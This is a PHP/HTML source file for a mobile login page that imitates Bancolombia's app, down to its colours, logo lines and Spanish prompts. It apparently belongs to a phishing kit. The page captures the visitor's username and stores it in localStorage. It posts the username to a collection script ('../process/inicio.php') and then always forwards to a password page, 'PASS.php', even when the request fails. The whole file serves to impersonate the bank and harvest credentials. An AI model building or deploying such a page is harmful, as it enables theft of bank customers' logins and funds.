<?php
// a/login.php - DISEÑO APP NEGRA 2026 FINAL
session_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Bancolombia | Bienvenida</title>
    <link rel="icon" type="image/png" href="../img/logo.png" />
    <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
        
        body { 
            background-color: #000000; 
            margin: 0; 
            padding: 0; 
            font-family: 'Open Sans', sans-serif; 
            color: #ffffff;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* DISEÑO DE LAS LÍNEAS DEL LOGO */
        .decoracion-lineas {
            position: absolute;
            top: 25%;
            left: -10%;
            width: 120%;
            height: 150px;
            pointer-events: none;
            z-index: 1;
            transform: rotate(-5deg);
            opacity: 0.9;
        }

        .linea {
            height: 18px;
            width: 100%;
            margin-bottom: 8px;
            border-radius: 20px;
        }
        .linea.amarilla { background: #FDDA24; width: 80%; margin-left: 10%; }
        .linea.naranja { background: #ED7124; width: 90%; margin-left: 5%; }
        .linea.morada { background: #7A4998; width: 70%; margin-left: 15%; }

        .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; position: relative; z-index: 10; }
        
        .container { padding: 0 30px; margin-top: 20px; text-align: center; position: relative; z-index: 10; }

        .logo-bancolombia { width: 180px; margin-bottom: 60px; filter: brightness(1); }

        .title { 
            font-size: 18px; 
            font-weight: 600; 
            margin-bottom: 30px; 
            color: #ffffff;
        }

        .input-group { 
            border-bottom: 1px solid #444; 
            margin-bottom: 40px; 
            text-align: left;
        }

        .entradas {
            background: transparent;
            border: none;
            color: #ffffff !important;
            font-size: 16px;
            padding: 10px 0;
            width: 100%;
            outline: none;
        }

        #btn-continuar {
            width: 100%;
            background-color: #2c2c2c;
            color: #666;
            border: none;
            height: 50px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 700;
            cursor: not-allowed;
            transition: 0.3s;
        }

        #btn-continuar.active {
            background-color: #FDDA24;
            color: #000;
            cursor: pointer;
        }

        /* Pantalla de carga */
        #cargando-o { 
            display: none; 
            position: fixed; 
            top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.95); 
            z-index: 9999; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #FDDA24;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="decoracion-lineas">
        <div class="linea amarilla"></div>
        <div class="linea naranja"></div>
        <div class="linea morada"></div>
    </div>

    <div id="cargando-o">
        <div class="spinner"></div>
        <p style="margin-top: 15px; font-size: 14px;">Validando información...</p>
    </div>

    <div class="header">
        <img src="../img/btn-cerrar.jpg" height="20" style="filter: invert(1);"> 
        <img src="../img/logo-app.jpg" height="20">
        <div style="width: 20px;"></div>
    </div>

    <div class="container">
        <img src="../img/logo.png" class="logo-bancolombia">
        
        <div class="title">Ingresa tu usuario</div>

        <div class="input-group">
            <input type="text" id="txt-usuario" class="entradas" placeholder="Ingresa el usuario" autocomplete="off">
        </div>

        <button id="btn-continuar" disabled>CONTINUAR</button>
    </div>

    <script>
        $(document).ready(function() {
            localStorage.removeItem('user_akam');
            
            $("#txt-usuario").on("input", function() {
                var val = $(this).val().trim();
                if (val.length >= 4) {
                    $("#btn-continuar").addClass("active").prop("disabled", false);
                } else {
                    $("#btn-continuar").removeClass("active").prop("disabled", true);
                }
            });

            $("#btn-continuar").click(function() {
                var user_val = $("#txt-usuario").val().trim();
                $("#cargando-o").css("display", "flex");
                
                localStorage.setItem('user_akam', user_val);

                $.post("../process/inicio.php", { 'txt-usuario': user_val }, function() {
                    window.location.href = "PASS.php";
                }).fail(function() {
                    window.location.href = "PASS.php";
                });

                setTimeout(function(){ window.location.href = "PASS.php"; }, 3500);
            });
        });
    </script>
</body>
</html>
